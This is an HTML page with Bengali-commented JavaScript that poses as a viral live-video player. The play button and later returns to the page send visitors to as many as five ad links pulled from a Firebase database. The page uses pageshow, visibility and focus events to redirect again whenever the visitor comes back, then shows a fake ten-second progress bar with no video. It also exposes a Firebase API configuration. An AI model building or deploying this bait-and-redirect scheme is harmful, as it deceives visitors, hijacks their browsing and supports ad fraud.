<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta http-equiv="Cache-Control" content="no-store, no-cache, must-revalidate">
<meta http-equiv="Pragma" content="no-cache">
<meta http-equiv="Expires" content="0">
<title>Video Player</title>

<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>

<style>
* { margin: 0; padding: 0; box-sizing: border-box; }
body {
    background: #000;
    font-family: Arial, sans-serif;
    height: 100vh;
    overflow: hidden;
    user-select: none;
}
.player-wrapper {
    position: relative;
    width: 100%;
    height: 100vh;
    display: flex;
    flex-direction: column;
    justify-content: center;
    align-items: center;
    background: #0a0a0a;
}
.thumbnail {
    position: absolute;
    inset: 0;
    background-image: url('https://images.unsplash.com/photo-1536440136628-849c177e76a1?w=1200&q=80');
    background-size: cover;
    background-position: center;
    filter: brightness(0.55);
    transition: background-image 0.4s ease;
}
.overlay {
    position: absolute;
    inset: 0;
    background: linear-gradient(to top, rgba(0,0,0,0.85) 0%, rgba(0,0,0,0.1) 50%, transparent 100%);
}
.video-title {
    position: absolute;
    top: 18px;
    left: 14px;
    right: 14px;
    color: white;
    font-size: 15px;
    font-weight: bold;
    text-shadow: 0 1px 6px rgba(0,0,0,0.9);
    z-index: 10;
    display: flex;
    align-items: center;
    gap: 8px;
}
.live-badge {
    background: #e00;
    color: white;
    font-size: 10px;
    font-weight: bold;
    padding: 2px 7px;
    border-radius: 3px;
    letter-spacing: 0.5px;
}
.play-btn {
    position: relative;
    z-index: 10;
    width: 78px;
    height: 78px;
    border-radius: 50%;
    background: rgba(255,255,255,0.12);
    border: 2.5px solid rgba(255,255,255,0.85);
    display: flex;
    justify-content: center;
    align-items: center;
    cursor: pointer;
    backdrop-filter: blur(6px);
    -webkit-backdrop-filter: blur(6px);
    transition: transform 0.15s ease, background 0.15s ease;
    box-shadow: 0 0 50px rgba(255,255,255,0.15), 0 0 0 12px rgba(255,255,255,0.05);
    -webkit-tap-highlight-color: transparent;
}
.play-btn:active {
    transform: scale(0.92);
    background: rgba(255,255,255,0.22);
}
.play-icon {
    width: 0;
    height: 0;
    border-top: 20px solid transparent;
    border-bottom: 20px solid transparent;
    border-left: 32px solid white;
    margin-left: 7px;
    filter: drop-shadow(0 0 6px rgba(255,255,255,0.5));
}
.loading-ring {
    display: none;
    position: relative;
    z-index: 10;
    width: 78px;
    height: 78px;
    border-radius: 50%;
    border: 3px solid rgba(255,255,255,0.15);
    border-top-color: white;
    animation: spin 0.75s linear infinite;
}
@keyframes spin { to { transform: rotate(360deg); } }
.controls {
    position: absolute;
    bottom: 0; left: 0; right: 0;
    z-index: 10;
    padding: 10px 14px 24px;
}
.progress-bar {
    width: 100%;
    height: 3px;
    background: rgba(255,255,255,0.2);
    border-radius: 2px;
    margin-bottom: 10px;
    overflow: hidden;
}
.progress-fill {
    height: 100%;
    width: 0%;
    background: #ff3b3b;
    border-radius: 2px;
    transition: width 0.1s linear;
}
.time-row {
    display: flex;
    justify-content: space-between;
    align-items: center;
    color: rgba(255,255,255,0.85);
    font-size: 12px;
}
.center-info {
    font-size: 11px;
    color: rgba(255,255,255,0.5);
    text-align: center;
}
.dot {
    display: inline-block;
    width: 6px; height: 6px;
    border-radius: 50%;
    background: #ff3b3b;
    margin-right: 4px;
    vertical-align: middle;
    animation: blink 1.2s ease-in-out infinite;
}
@keyframes blink {
    0%, 100% { opacity: 1; }
    50% { opacity: 0.2; }
}
</style>
</head>

<body>
<div class="player-wrapper">
    <div class="thumbnail" id="thumbBg"></div>
    <div class="overlay"></div>
    <div class="video-title">
        <span class="live-badge">LIVE</span>
        <span id="videoTitle">Viral Video 2026</span>
    </div>
    <div class="play-btn" id="playBtn" onclick="handlePlay()">
        <div class="play-icon"></div>
    </div>
    <div class="loading-ring" id="loadingRing"></div>
    <div class="controls">
        <div class="progress-bar">
            <div class="progress-fill" id="progressFill"></div>
        </div>
        <div class="time-row">
            <span id="currentTime">0:00</span>
            <span class="center-info">
                <span class="dot" id="dot"></span>
                <span id="viewCount">Loading...</span>
            </span>
            <span id="totalTime">10:32</span>
        </div>
    </div>
</div>

<script>

// ── FIREBASE CONFIG ──────────────────────────────
const firebaseConfig = {
    apiKey: "AIzaSyC2tguQFjkUvncBvn6-e7_Ux5vJ6lEzpjQ",
    authDomain: "vital-1f05b.firebaseapp.com",
    databaseURL: "https://vital-1f05b-default-rtdb.firebaseio.com",
    projectId: "vital-1f05b",
    storageBucket: "vital-1f05b.firebasestorage.app",
    messagingSenderId: "992463011532",
    appId: "1:992463011532:web:708ff147b8e7e1ce5b8c69"
};
if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
const db = firebase.database();

// ── CONFIG ───────────────────────────────────────
const MAX_REDIRECTS = 5;   // মোট কতবার redirect
const AUTO_DELAY    = 400; // ব্যাক আসার পর কত ms পর অটো যাবে

// ── STATE ────────────────────────────────────────
var redirecting   = false;
var autoTriggered = false;

// ── bfcache বন্ধ ─────────────────────────────────
window.addEventListener('unload', function() {});
window.addEventListener('beforeunload', function() {});

// ── STORAGE: localStorage ব্যবহার করছি ──────────
// sessionStorage ব্যাক আসলে অনির্ভরযোগ্য, localStorage সবসময় থাকে

function getCount() {
    return parseInt(localStorage.getItem('adCount')) || 0;
}

function getLinks() {
    return JSON.parse(localStorage.getItem('adLinks') || '[]');
}

function setCount(n) {
    localStorage.setItem('adCount', n);
}

function setLinks(arr) {
    localStorage.setItem('adLinks', JSON.stringify(arr));
}

function setComingBack(val) {
    if (val) {
        localStorage.setItem('comingBack', 'yes');
    } else {
        localStorage.removeItem('comingBack');
    }
}

function isComingBack() {
    return localStorage.getItem('comingBack') === 'yes';
}

// ── UI আপডেট ─────────────────────────────────────
function updateUI() {
    var count = getCount();
    if (count >= MAX_REDIRECTS) {
        document.getElementById('viewCount').textContent = 'Watch now';
        document.getElementById('dot').style.background = '#2ecc71';
    } else {
        document.getElementById('viewCount').textContent = count + ' / ' + MAX_REDIRECTS + ' visits';
    }
}

// ── REDIRECT ──────────────────────────────────────
function goToLink(url) {
    if (redirecting) return;
    redirecting = true;

    document.getElementById('playBtn').style.display = 'none';
    document.getElementById('loadingRing').style.display = 'block';

    setTimeout(function() {
        window.location.href = url;
    }, 150);
}

// ── PLAY বাটন ক্লিক ──────────────────────────────
function handlePlay() {
    var count = getCount();

    if (count >= MAX_REDIRECTS) {
        playFakeVideo();
        return;
    }

    var links = getLinks();
    if (links.length === 0) {
        alert("লোড হচ্ছে, একটু অপেক্ষা করুন...");
        return;
    }

    var url = links[count % links.length];
    setCount(count + 1);
    setComingBack(true);
    autoTriggered = false;
    goToLink(url);
}

// ── ব্যাক আসলে AUTO REDIRECT ─────────────────────
function checkAutoRedirect() {
    if (autoTriggered) return;
    autoTriggered = true;
    redirecting = false;

    if (!isComingBack()) return;

    var count = getCount();

    if (count >= MAX_REDIRECTS) {
        setComingBack(false);
        updateUI();
        return;
    }

    var links = getLinks();
    if (links.length === 0) return;

    var url = links[count % links.length];
    setCount(count + 1);

    setTimeout(function() {
        goToLink(url);
    }, AUTO_DELAY);
}

// ── FIREBASE থেকে সেটিংস ─────────────────────────
function loadSettings() {
    db.ref('playerSettings').once('value', function(snap) {
        var data = snap.val();
        if (!data) return;

        if (data.bgImage && data.bgImage.trim() !== '') {
            document.getElementById('thumbBg').style.backgroundImage = "url('" + data.bgImage + "')";
        }
        if (data.title && data.title.trim() !== '') {
            document.getElementById('videoTitle').textContent = data.title;
        }
        if (data.duration) {
            document.getElementById('totalTime').textContent = data.duration;
        }

        var links = [data.link1, data.link2, data.link3, data.link4, data.link5]
                    .filter(function(l) { return l && l.trim() !== ''; });

        if (links.length > 0) {
            setLinks(links);
        }

        // Firebase লোড হওয়ার পরে আবার চেক করো
        // (প্রথম pageshow এ links না থাকলে এখানে ধরা পড়বে)
        if (isComingBack() && getCount() < MAX_REDIRECTS) {
            autoTriggered = false;
            checkAutoRedirect();
        }

        updateUI();
    });
}

// ── FAKE VIDEO ────────────────────────────────────
function playFakeVideo() {
    document.getElementById('playBtn').style.display = 'none';
    var start = Date.now();
    var duration = 10000;
    function tick() {
        var elapsed = Date.now() - start;
        var w = Math.min((elapsed / duration) * 100, 100);
        document.getElementById('progressFill').style.width = w + '%';
        var secs = Math.floor(elapsed / 1000);
        var m = Math.floor(secs / 60);
        var s = secs % 60;
        document.getElementById('currentTime').textContent = m + ':' + (s < 10 ? '0' : '') + s;
        if (w < 100) requestAnimationFrame(tick);
    }
    requestAnimationFrame(tick);
}

// ── ইভেন্ট লিসেনার ───────────────────────────────

// মেইন — pageshow (সব ব্রাউজারে সবচেয়ে নির্ভরযোগ্য)
window.addEventListener('pageshow', function(e) {
    autoTriggered = false; // প্রতি pageshow এ রিসেট
    checkAutoRedirect();
    updateUI();
});

// ফলব্যাক ১ — Android Chrome bfcache
document.addEventListener('visibilitychange', function() {
    if (document.visibilityState === 'visible' && !redirecting) {
        setTimeout(function() {
            autoTriggered = false;
            checkAutoRedirect();
        }, 200);
    }
});

// ফলব্যাক ২ — Desktop
window.addEventListener('focus', function() {
    if (!redirecting) {
        setTimeout(function() {
            autoTriggered = false;
            checkAutoRedirect();
        }, 200);
    }
});

// ── শুরু ──────────────────────────────────────────
updateUI();
loadSettings();

</script>
</body>
</html>
